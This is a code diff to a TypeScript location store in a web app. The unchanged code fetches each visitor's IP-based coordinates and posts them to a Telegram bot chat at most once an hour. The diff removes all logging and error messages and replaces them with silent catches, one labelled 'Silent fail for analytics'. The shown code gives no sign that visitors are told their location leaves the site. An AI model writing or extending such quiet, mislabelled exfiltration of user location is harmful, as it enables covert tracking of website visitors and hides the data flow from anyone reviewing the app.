@@ -57,8 +57,7 @@ const reverseGeocode = async (lat: number, lon: number) => {
       country: getComponent("country"),
       formatted: data.results[0].formatted_address || "",
     };
-  } catch (err) {
-    console.error("[LocationStore] Reverse geocoding failed:", err);
+  } catch {
     return null;
   }
 };
@@ -84,7 +83,6 @@ const sendLocationToTelegram = async (lat: number, lon: number) => {
     const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
 
     if (!botToken || !chatId) {
-      console.warn("[LocationStore] Telegram credentials not configured");
       return;
     }
 
@@ -127,9 +125,8 @@ const sendLocationToTelegram = async (lat: number, lon: number) => {
       }),
     });
 
-    console.log("[LocationStore] Location sent to Telegram");
-  } catch (err) {
-    console.error("[LocationStore] Failed to send location to Telegram:", err);
+  } catch {
+    // Silent fail for analytics
   }
 };
 
@@ -148,7 +145,6 @@ export const useLocationStore = create<LocationState>()(
 
         // Skip if sent within cache interval (1 hour)
         if (state.ip_location_sent && Date.now() - state.ip_location_sent < LOCATION_CACHE_MS) {
-          console.log("[LocationStore] IP location already sent within cache interval");
           return;
         }
 
@@ -171,8 +167,6 @@ export const useLocationStore = create<LocationState>()(
           const data = await response.json();
           const { lat, lng } = data.location;
 
-          console.log("[LocationStore] IP-based location fetched:", { lat, lng });
-
           // Store IP location as fallback (if no precise location yet)
           if (!state.location) {
             set({
@@ -184,8 +178,8 @@ export const useLocationStore = create<LocationState>()(
           // Send to Telegram and update cache timestamp
           await sendLocationToTelegram(lat, lng);
           set({ ip_location_sent: Date.now() });
-        } catch (err) {
-          console.error("[LocationStore] IP location fetch failed:", err);
+        } catch {
+          // Silent fail for IP location
         }
       },
 
@@ -195,7 +189,6 @@ export const useLocationStore = create<LocationState>()(
 
         // Skip if updated within cache interval (and it's precise location, not IP)
         if (state.last_updated && Date.now() - state.last_updated < LOCATION_CACHE_MS) {
-          console.log("[LocationStore] Skipping - updated within cache interval");
           return;
         }
 
@@ -207,12 +200,10 @@ export const useLocationStore = create<LocationState>()(
 
         // Check if browser Geolocation API is supported
         if (!navigator.geolocation) {
-          console.log("[LocationStore] Browser geolocation not supported, using IP location");
           set({ isLoading: false });
           return;
         }
 
-        console.log("[LocationStore] Requesting precise location from browser...");
         set({ isLoading: true, error: null });
 
         try {
@@ -228,15 +219,13 @@ export const useLocationStore = create<LocationState>()(
 
           const { latitude, longitude } = position.coords;
 
-          console.log("[LocationStore] Browser location fetched:", { latitude, longitude });
           set({
             location: { lat: latitude, lon: longitude },
             last_updated: Date.now(),
             isLoading: false,
             error: null,
           });
-        } catch (err) {
-          console.log("[LocationStore] Browser geolocation denied/failed, using IP location");
+        } catch {
           set({ isLoading: false });
           // IP location is already set by fetchIpLocation, so we're good
         }
